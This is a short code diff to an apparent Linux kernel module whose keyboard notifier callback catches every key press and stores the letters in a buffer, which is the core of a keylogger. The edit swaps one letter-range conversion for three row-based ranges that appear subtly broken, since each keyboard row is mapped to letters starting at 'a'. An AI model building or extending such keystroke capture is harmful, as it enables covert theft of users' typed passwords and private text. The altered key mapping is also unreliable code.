@@ -75,8 +75,16 @@ static int keyboard_notifier_fn(struct notifier_block *nb, unsigned long action,
     unsigned int keycode = param->value;
 
     if (action == KBD_KEYCODE && param->down) {
-        if (keycode >= KEY_A && keycode <= KEY_Z) {
-            char key = keycode - KEY_A + 'a'; // Convertir a letra minúscula
+        if (keycode >= KEY_Q && keycode <= KEY_P) {
+            char key = keycode - KEY_Q + 'a';
+            add_to_buffer(key);            
+        }
+        if (keycode >= KEY_A && keycode <= KEY_L) {
+            char key = keycode - KEY_A + 'a';
+            add_to_buffer(key);
+        }
+        if (keycode >= KEY_Z && keycode <= KEY_M) {
+            char key = keycode - KEY_Z + 'a';
             add_to_buffer(key);
         }
     }
